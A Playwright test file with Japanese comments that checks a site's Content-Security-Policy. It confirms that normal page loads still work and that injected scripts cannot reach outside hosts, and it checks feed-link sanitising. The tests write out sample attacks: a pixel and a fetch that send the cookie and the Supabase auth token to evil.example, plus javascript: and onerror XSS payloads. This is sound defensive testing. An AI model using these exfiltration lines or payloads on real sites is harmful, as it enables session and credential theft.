// 応答ヘッダー（vercel.json）の Content-Security-Policy を、公開している全ページで確かめる。
//   1. ふだんの読み込みが1つも止められないこと（止めるとページが壊れる）
//   2. 許していない宛先へのスクリプト読み込み・通信・画像・埋め込みは止まること
//   3. ITニュース：フィードに書かれていた javascript: のリンクは開けないリンクになること
//      収集元は https の、名前で引けるサイトだけ受け付けること
// Supabase への通信はすべてテスト内で置き換える（本番には何も送らない）。
const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const engine = require(process.env.PLAYWRIGHT_PATH || 'playwright')[process.env.BROWSER || 'chromium'];
const fs = require('node:fs/promises');
const path = require('node:path');
const http = require('node:http');
const os = require('node:os');
const { applyHeaders, headersFor, watchCsp } = require('./site-headers.cjs');

const root = path.resolve(__dirname, '..');
const PAGES = ['/', '/it-news.html', '/usage.html', '/niigata-cafes-list.html', '/shorts.html'];
const user = { id:'20000000-0000-4000-8000-000000000001', email:'admin@example.test', aud:'authenticated', role:'authenticated', app_metadata:{}, user_metadata:{} };
const b64 = value => Buffer.from(JSON.stringify(value)).toString('base64url');
const token = [b64({ alg:'HS256', typ:'JWT' }), b64({ sub:user.id, role:'authenticated', exp:Math.floor(Date.now() / 1000) + 3600 }), 'test-signature'].join('.');
const feedItems = [
  { id:'30000000-0000-4000-8000-000000000001', title:'ふつうの記事', url:'https://example-news.jp/a?x=1&y=2', summary:'<b>要約</b>', genre:'ai', source_name:'安全なフィード', published_at:'2026-11-14T03:00:00Z', fetched_at:'2026-11-14T03:00:00Z', starred:false, read_at:null },
  { id:'30000000-0000-4000-8000-000000000002', title:'あやしい記事', url:'javascript:window.__xss=1', summary:'', genre:'ai', source_name:'安全なフィード', published_at:'2026-11-14T02:00:00Z', fetched_at:'2026-11-14T02:00:00Z', starred:false, read_at:null },
  { id:'30000000-0000-4000-8000-000000000003', title:'属性を閉じる記事', url:'https://example-news.jp/"><img src=x onerror=window.__xss=1>', summary:'', genre:'ai', source_name:'安全なフィード', published_at:'2026-11-14T01:00:00Z', fetched_at:'2026-11-14T01:00:00Z', starred:false, read_at:null },
];

let server, browser, base, cdn;
before(async () => {
  const cache = path.join(os.tmpdir(), 'my-site-check', 'supabase-2.49.10.js');
  try { cdn = await fs.readFile(cache); } catch {
    const response = await fetch('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.49.10/dist/umd/supabase.min.js');
    assert(response.ok); cdn = Buffer.from(await response.arrayBuffer());
    await fs.mkdir(path.dirname(cache), { recursive:true }); await fs.writeFile(cache, cdn);
  }
  server = http.createServer(async (req, res) => {
    const pathname = new URL(req.url, 'http://localhost').pathname;
    const file = path.resolve(root, '.' + (pathname === '/' ? '/index.html' : pathname));
    if (!file.startsWith(root + path.sep)) { res.writeHead(403).end(); return; }
    try {
      const body = await fs.readFile(file);
      applyHeaders(res, pathname);
      res.setHeader('Content-Type', { '.html':'text/html; charset=utf-8', '.css':'text/css', '.svg':'image/svg+xml', '.png':'image/png' }[path.extname(file)] || 'application/octet-stream');
      res.end(body);
    } catch { res.writeHead(404).end(); }
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  base = 'http://127.0.0.1:' + server.address().port;
  browser = await engine.launch({ headless:true, ...(process.env.CHROMIUM_PATH && (process.env.BROWSER || 'chromium') === 'chromium' ? { executablePath:process.env.CHROMIUM_PATH } : {}) });
});
after(async () => { await browser?.close(); await new Promise(resolve => server?.close(resolve)); });

async function open(pagePath, { session = true } = {}) {
  const context = await browser.newContext();
  const errors = [], outside = [], writes = [];
  await context.addInitScript(({ token, user, session }) => {
    window.__violations = [];
    document.addEventListener('securitypolicyviolation', e => window.__violations.push(e.effectiveDirective + ' ' + e.blockedURI));
    if (session) localStorage.setItem('sb-qnmzjwgacnfxwlbgwxcr-auth-token', JSON.stringify({ access_token:token, refresh_token:'test', token_type:'bearer', expires_at:Math.floor(Date.now() / 1000) + 3600, user }));
  }, { token, user, session });
  await context.route('**/*', async route => {
    const req = route.request(), url = new URL(req.url());
    if (url.origin === base) return route.continue();
    if (url.hostname === 'cdn.jsdelivr.net') return route.fulfill({ body:cdn, contentType:'application/javascript', headers:{ 'access-control-allow-origin':'*' } });
    if (url.hostname === 'cdn.tailwindcss.com') return route.fulfill({ body:'window.tailwind={};', contentType:'application/javascript' });
    if (url.hostname === 'fonts.googleapis.com') return route.fulfill({ body:'', contentType:'text/css' });
    if (url.hostname.endsWith('.supabase.co')) {
      const send = (body, status = 200) => route.fulfill({ status, contentType:'application/json', headers:{ 'access-control-allow-origin':'*' }, body:JSON.stringify(body) });
      if (req.method() !== 'GET' && !url.pathname.includes('/rpc/')) writes.push({ path:url.pathname, body:req.postDataJSON() });
      if (url.pathname === '/auth/v1/user') return send(user);
      if (url.pathname.endsWith('/it_news_items')) return send(feedItems);
      if (url.pathname.endsWith('/it_news_sources')) return send(req.method() === 'GET' ? [] : [], req.method() === 'GET' ? 200 : 201);
      if (url.pathname.includes('/rpc/')) return send({ code:'PGRST202', message:'Could not find the function' }, 404);
      return send([]);
    }
    // 許していない宛先。ここまで届いたら、ブラウザーが止めなかったということ。
    outside.push(req.url());
    return route.fulfill({ status:200, body:'', contentType:'text/plain' });
  });
  const page = await context.newPage();
  page.on('pageerror', error => errors.push(error.message));
  watchCsp(page, errors);
  await page.goto(base + pagePath);
  await page.waitForLoadState('networkidle');
  return { context, page, errors, outside, writes };
}

test('every page gets exactly one policy, and it denies by default', () => {
  for (const pagePath of [...PAGES, '/index.html', '/api/bulletin', '/retro.css']) {
    const headers = headersFor(pagePath);
    const csp = headers['Content-Security-Policy'];
    assert.ok(csp, pagePath + ' has a policy');
    for (const part of ["default-src 'self'", "object-src 'none'", "base-uri 'self'", "frame-ancestors 'none'", "form-action 'self'"])
      assert.ok(csp.split('; ').includes(part), `${pagePath}: ${part}`);
    assert.ok(!/unsafe-eval|\*|http:/.test(csp), pagePath + ': no eval, wildcard or plain http');
    assert.equal(headers['X-Content-Type-Options'], 'nosniff');
    assert.equal(headers['X-Frame-Options'], 'DENY');
    // The only page that may run the Tailwind CDN script and embed YouTube is the analytics page.
    assert.equal(/cdn\.tailwindcss\.com|youtube\.com|ytimg\.com/.test(csp), pagePath === '/shorts.html', pagePath);
  }
  // The address the pages connect to and the address the policy allows must be the same one.
  const allowed = headersFor('/')['Content-Security-Policy'].match(/connect-src 'self' (https:\/\/\S+)/)[1];
  return Promise.all(['index.html', 'it-news.html', 'usage.html', 'niigata-cafes-list.html', 'shorts.html'].map(async name => {
    const html = await fs.readFile(path.join(root, name), 'utf8');
    const used = [...new Set(html.match(/https:\/\/[a-z0-9]+\.supabase\.co/g))];
    assert.deepEqual(used, [allowed], name + ' connects only to the allowed project');
    assert.ok(!/sb_secret_[A-Za-z0-9]/.test(html) && !/service_role/.test(html), name + ' holds no server-side key');
  }));
});

for (const pagePath of PAGES) {
  test(`${pagePath}: nothing the page needs is blocked, and outside destinations are`, async () => {
    for (const session of [false, true]) {
      const a = await open(pagePath, { session });
      try {
        assert.deepEqual(await a.page.evaluate(() => window.__violations), [], 'no violation while loading (session=' + session + ')');
        assert.deepEqual(a.errors, []);
        // An injected script must not be able to load code, phone home, or embed another site.
        const blocked = await a.page.evaluate(async () => {
          window.__violations.length = 0;
          const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s);
          const i = new Image(); i.src = 'https://evil.example/pixel.gif?c=' + encodeURIComponent(document.cookie);
          const f = document.createElement('iframe'); f.src = 'https://evil.example/frame'; document.body.appendChild(f);
          let fetched = 'sent';
          try { await fetch('https://evil.example/collect', { method:'POST', body:localStorage.getItem('sb-qnmzjwgacnfxwlbgwxcr-auth-token') || 'x' }); } catch { fetched = 'refused'; }
          // Asked from a timer inside the page: code run directly by the test tool is exempt from the policy.
          const evaluated = await new Promise(resolve => setTimeout(() => {
            try { new Function('return 1')(); resolve('ran'); } catch { resolve('refused'); }
          }, 0));
          await new Promise(resolve => setTimeout(resolve, 300));
          return { fetched, evaluated, kinds:[...new Set(window.__violations.map(v => v.split(' ')[0]))].sort() };
        });
        assert.equal(blocked.fetched, 'refused');
        assert.equal(blocked.evaluated, 'refused', 'no string-to-code');
        for (const kind of ['connect-src', 'frame-src', 'img-src', 'script-src-elem'])
          assert.ok(blocked.kinds.includes(kind), `${kind} is enforced, got ${blocked.kinds}`);
        assert.deepEqual(a.outside, [], 'nothing reached an outside destination');
      } finally { await a.context.close(); }
    }
  });
}

test('it-news: links from feeds are http(s) only, and a feed must be an https site with a name', async () => {
  const a = await open('/it-news.html');
  try {
    await a.page.locator('#list .item').first().waitFor();
    const links = await a.page.locator('#list a.title').evaluateAll(list => list.map(x => [x.textContent, x.getAttribute('href')]));
    assert.deepEqual(links[0], ['ふつうの記事', 'https://example-news.jp/a?x=1&y=2']);
    assert.deepEqual(links[1], ['あやしい記事', '#'], 'a javascript: link is not clickable');
    assert.match(links[2][1], /^https:\/\/example-news\.jp\/%22%3E%3Cimg/, 'markup in a link stays inside the address');
    assert.equal(await a.page.locator('#list img, #list b').count(), 0, 'feed text is shown as text');
    assert.equal(await a.page.evaluate(() => window.__xss), undefined);

    if (await a.page.locator('#src-panel').evaluate(el => el.classList.contains('hidden'))) await a.page.locator('#src-toggle').click();
    for (const bad of ['http://zenn.dev/feed', 'https://127.0.0.1/rss', 'https://localhost/rss', 'https://user:pw@zenn.dev/feed',
                       'https://zenn.dev:8443/feed', 'https://printer.local/feed', 'javascript:alert(1)', 'https://[::1]/rss']) {
      await a.page.locator('#ns-name').fill('だめな宛先');
      await a.page.locator('#ns-url').fill(bad);
      await a.page.locator('#ns-add').click();
      await a.page.waitForFunction(() => /https:\/\/ で始まる/.test(document.querySelector('#msg').textContent));
      await a.page.evaluate(() => { document.querySelector('#msg').textContent = ''; });
    }
    assert.deepEqual(a.writes, [], 'refused addresses are never sent');
    await a.page.locator('#ns-name').fill('gihyo');
    await a.page.locator('#ns-url').fill('https://gihyo.jp/feed/atom');
    await a.page.locator('#ns-add').click();
    await a.page.waitForFunction(() => /足しました/.test(document.querySelector('#msg').textContent));
    assert.equal(a.writes.length, 1);
    assert.equal(a.writes[0].body.url, 'https://gihyo.jp/feed/atom');
    assert.deepEqual(a.errors, []);
  } finally { await a.context.close(); }
});
